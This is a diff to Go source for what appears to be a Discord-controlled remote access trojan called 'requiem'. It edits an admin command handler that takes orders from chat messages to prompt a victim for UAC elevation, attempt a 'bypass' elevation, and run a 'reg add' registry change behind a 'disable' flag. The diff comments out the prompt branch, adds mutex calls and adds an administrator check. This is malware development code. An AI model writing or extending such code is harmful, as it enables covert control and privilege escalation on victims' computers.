@@ -6,7 +6,6 @@ import (
 	"strings"
 	"time"
 
-	"requiem/funcs"
 	"requiem/store"
 	"requiem/utils"
 
@@ -27,16 +26,20 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		return
 	}
 
-	if utils.HasFlag(content, "ask") {
-		elevated := funcs.AttempElevate()
-		if !elevated {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 User did not accept the UAC prompt.", msg.Reference())
-			return
-		}
+	// if utils.HasFlag(content, "ask") {
+	// 	utils.RemoveMutex()
 
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 UAC prompt accepted, restarting...", msg.Reference())
-		return
-	}
+	// 	elevated := funcs.AttempElevate()
+	// 	if !elevated {
+	// 		utils.CheckMutex()
+
+	// 		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 User did not accept the UAC prompt.", msg.Reference())
+	// 		return
+	// 	}
+
+	// 	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 UAC prompt accepted, restarting...", msg.Reference())
+	// 	return
+	// }
 
 	if utils.HasFlag(content, "bypass") {
 		ses.ChannelMessageSendReply(msg.ChannelID, "Attempting to elevate...", msg.Reference())
@@ -94,6 +97,11 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 	}
 
 	if utils.HasFlag(content, "disable") {
+		if !store.IsAdmin {
+			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Administrator privileges are required to do this.", msg.Reference())
+			return
+		}
+
 		err := utils.RunCommand(
 			"reg", "add",
 			"",
